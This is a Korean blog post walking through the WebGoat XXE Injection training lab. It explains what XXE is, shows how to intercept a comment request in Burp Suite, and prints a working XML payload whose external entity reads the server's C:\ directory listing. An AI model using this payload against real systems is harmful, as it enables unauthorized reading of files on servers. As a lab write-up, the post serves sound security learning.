---
layout: post
title: WebGoat - XXE Injection (1)
date: 2021-01-13 18:00:00 +0900
category: Web_Hacking
---

# WebGoat - XXE Injection (1)

#### 이미지가 포함된 게시글에 댓글 작성 시 XXE Injection을 시도하여 시스템의 root 디렉토리에 있는 파일들의 이름 나열하기

<br/>

> XXE(XML eXternal Entity) Injection이란 XML이 외부 엔티티를 포함하고  있을 때, 이를 이용하여 기밀 데이터 유출, DoS 등을 유발하는 공격이다.

<br/>

댓글을 작성한 후 Burp Suite를 통해 보면 Content-Type이 application.xml인 것을 알 수 있고, 이를 통해 body 부분에 XML이 전송된다는 것을 알 수 있다.

![webgoat_xxe1_1](/public/img/webgoat_xxe1_1.PNG)

![webgoat_xxe1_2](/public/img/webgoat_xxe1_2.PNG)

<br/>

이제 xml이 포함된 request를 intercept하여 body부분을 아래와 같이 수정하여 전송해보자.

SYSTEM이라는 예약어를 사용하면 해당 엔티티는 외부 엔티티가 된다.

```shell
<?xml version="1.0" standalone="yes" ?>
<!DOCTYPE comment [
  <!ELEMENT comment (#PCDATA)>
  <!ENTITY js SYSTEM "file:///c:/">
]>
<comment>
<text>&js;</text>
</comment>
```

![webgoat_xxe1_3](/public/img/webgoat_xxe1_3.PNG)

<br/>

그 결과, 현재 C드라이브에 존재하는 모든 디렉토리와 파일들이 보여진다.

![webgoat_xxe1_4](/public/img/webgoat_xxe1_4.PNG)

